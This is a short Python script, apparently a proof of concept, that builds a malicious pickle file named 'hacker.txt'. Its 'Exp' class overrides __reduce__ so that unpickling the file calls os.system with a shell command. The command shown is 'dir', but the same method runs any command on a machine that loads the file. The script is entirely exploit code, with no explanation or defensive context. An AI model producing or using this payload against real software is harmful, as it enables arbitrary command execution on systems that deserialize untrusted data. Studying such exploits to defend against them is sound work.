#!/usr/bin/python3
import os
import pickle
import base64
class Exp(object):
    def __reduce__(self):
        return (os.system, ('dir',))
with open('./hacker.txt','wb') as file:
    pickle.dump(Exp(),file)